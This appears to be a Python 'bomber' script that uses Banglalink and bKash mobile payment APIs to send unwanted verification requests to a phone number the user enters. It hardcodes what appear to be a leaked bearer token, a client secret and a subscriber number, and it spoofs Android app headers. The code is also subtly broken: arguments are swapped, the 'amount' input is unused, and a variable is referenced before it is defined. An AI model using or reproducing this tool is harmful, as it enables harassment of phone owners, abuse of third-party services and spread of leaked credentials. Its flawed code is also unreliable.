import requests
import os
import time
import random
from requests.exceptions import ConnectionError

def get_input():
    phone_number = input('\x1b[91mEnter the phone number:\x1b[0m ')
    amount = int(input('\x1b[91mEnter the amount:\x1b[0m '))
    return phone_number, amount

def print_with_magic(color_code, text):
    print(f"\x1b[{color_code}m {text}\x1b[m")
    time.sleep(0.1)

def check_internet():
    try:
        requests.get('http://www.google.com', timeout=1)
        return True
    except ConnectionError:
        return False

ascii_art = [
    '    ::::::::::::::::::::::::::::::::::::::::',
    '    :: ____   _  __    _     ____   _   _ ::',
    '    ::| __ ) | |/ /   / \\   / ___| | | | |::',
    "    ::|  _ \\ | ' /   / _ \\  \\___ \\ | |_| |::",
    '    ::| |_) || . \\  / ___ \\  ___) ||  _  |::',
    '    ::|____/ |_|\\_\\/_/   \\_\\|____/ |_| |_|::',
    '    ::                                    ::',
    '    ::::::::::::::::::::::::::::::::::::::::',
    '    ::::::::::::::::::::::::::::::::::::::::',
    '    │Author: Md.Arman Hussen        │',
    '    │Github: TeamBlackBerry         │',
    '    │Tool: Bkash Bomber             │',
    '    │Coder: Arman                   │',
    '    └──────────────────────────────┘'
]

color_codes = [91, 93, 92, 94, 95]

terminal_width = os.get_terminal_size().columns

for line in ascii_art:
    padding = (terminal_width - len(line) - 2) // 2
    print_with_magic(' ' * padding + line, color_codes[ascii_art.index(line) % len(color_codes)])

def initialize_binding():
    url1 = 'https://myblapi.banglalink.net/api/v1/initialize-binding'
    header1 = {
        'Authorization': 'Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsImp0aSI6IjliNGVhZTk2YTRkYjA5MmFmZjQyYmZlMzk1NzEzZGZkNTJkODJlNzZlODRlYjUzMmEwOWQ3ZDY5NWI4ZjU1NWRiNGQxYjc1ZjQzNWVjMmU5In0.eyJhdWQiOiJmOGViZTc2MC0wZWIzLTExZWEtOGIwOC00M2E4MmNjOWQxOGMiLCJqdGkiOiI5YjRlYWU5NmE0ZGIwOTJhZmY0MmJmZTM5NTcxM2RmZDUyZDgyZTc2ZTg0ZWI1MzJhMDlkN2Q2OTViOGY1NTVkYjRkMWI3NWY0MzVlYzJlOSIsImlhdCI6MTcxODQ3NjM3NCwibmJmIjoxNzE4NDc2Mzc0LCJleHAiOjE3NTAwMTIzNzQsInN1YiI6IjMyMTEwNDQzIiwic2NvcGVzIjpbXX0.QAQ4FKcS6-2PHWvcVX9aLaIrwGk5y9kT6195CjyToM_QTZpLr4OcI7RFW-i6BBioMy00kESgHeVwMpHXKLwAXuttYUslTEk_0sfmLrCm3aU7UmG6EOPc1an1fxaoXjHmU-sPdrdlPHDozO8QqDqek6kn_z7fZ_ktT8etUvREQvRFOFNJYz8uESavS9TexXD6sR29GNA10P1nZ4DKUZWqCPk7B8C2xRi0ILPrre45YZUTeqFrsJQUvAzybmVIneU6-LGDpCiGLIqT58IPASwnksMTZpf70KIAk-Ncy9zM1ClDtAdlJ064_MWY7Y8DJQyO4TocYX_zGZ9oa3uF7-yF4qDscInOz0KAGK9QsgnB2RZLCufeBZmRPOVNKAgvrSBvs-DJI2XVj1Wq861V0tq0bTPqyYZ6eXQeZT6zt71qUPqvhUTgTy_M3WvlPPMh5uSc9yb2rKgdz3Ru0STu0byYBRQX5lCv7na3bZKO-w17VolmwOHa2OIkruuEzL1s4Kq0q6V_zK4CFYHb2la9FzEsF9itN58WxdTkLSM-WHGv0zjHt6fHyuMEerBB01Rk7CAkkOrF6MbdWEYk7kI6VoaK5aMb7uiY4KzK5Yn1XwtBQBR3bGy7wWfHh4Vb8XouMB_maAhqmAOSu51VUxmQkB_pHbjivrkHJf7yqVH-Sf10Z6o',
        'Accept-Language': 'en',
        'platform': 'android',
        'app-version': '11.11.0',
        'version-code': '1111000',
        'api-client-pass': '1E6F751EBCD16B4B719E76A34FBA9',
        'msisdn': '01936503139',
        'connection-type': 'prepaid',
        'X-Entitlements': 'PREPAID',
        'Content-Length': '0',
        'Host': 'myblapi.banglalink.net',
        'Connection': 'Keep-Alive',
        'Accept-Encoding': 'gzip',
        'User-Agent': 'okhttp/5.0.0-alpha.10'
    }
    response = requests.post(url1, headers=header1, data='')
    if response.status_code == 200:
        response_json = response.json()
        if response_json.get('status') == 'SUCCESS':
            authUrl = response_json['data']['authUrl']
            return authUrl.split('hashCode=')[1].split('&')[0]
    else:
        print('Initialization failed:', response_json.get('message'))
    return None

def verify_account(phone_no, hashCode):
    url2 = 'https://directcharge.pay.bka.sh/capabilitycore/portal/verifyAccount'
    header2 = {
        'Host': 'directcharge.pay.bka.sh',
        'content-length': '267',
        'sec-ch-ua': '"Android WebView";v="125", "Chromium";v="125", "Not.A/Brand";v="24"',
        'accept': 'application/json, text/javascript, */*',
        'content-type': 'application/json;charset=UTF-8',
        'sec-ch-ua-mobile': '?1',
        'user-agent': 'Mozilla/5.0 (Linux; Android 11; 21121119SG Build/RP1A.200720.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/125.0.6422.165 Mobile Safari/537.36',
        'sec-ch-ua-platform': '"Android"',
        'origin': 'https://directcharge.payment.bkash.com',
        'x-requested-with': 'com.arena.banglalinkmela.app',
        'sec-fetch-site': 'cross-site',
        'sec-fetch-mode': 'cors',
        'sec-fetch-dest': 'empty',
        'referer': 'https://directcharge.payment.bkash.com/',
        'accept-encoding': 'gzip, deflate, br, zstd',
        'accept-language': 'en,en-US;q=0.9',
        'priority': 'u=1, i'
    }
    payload = {
        'super_local': '',
        'phoneNo': phone_no,
        'hashCode': hashCode,
        'redirectUri': 'https://assetlite-test.banglalink.net/en/pay-success'
    }
    response = requests.post(url2, headers=header2, json=payload)
    if response.status_code == 200:
        return response.json()
    else:
        print('Failed to initialize binding:', response.status_code, response.text)
    return None

def main():
    if not check_internet():
        print('\x1b[91m❌ No internet connection. Exiting...\x1b[0m')
        exit()
    os.system('clear')
    for line in ascii_art:
        padding = (terminal_width - len(line) - 2) // 2
        print_with_magic(' ' * padding + line, color_codes[ascii_art.index(line) % len(color_codes)])
    phone_number, amount = get_input()
    hashCode = initialize_binding()
    if hashCode:
        response = verify_account(phone_number, hashCode)
        if response:
            print(response)

if __name__ == '__main__':
    main()


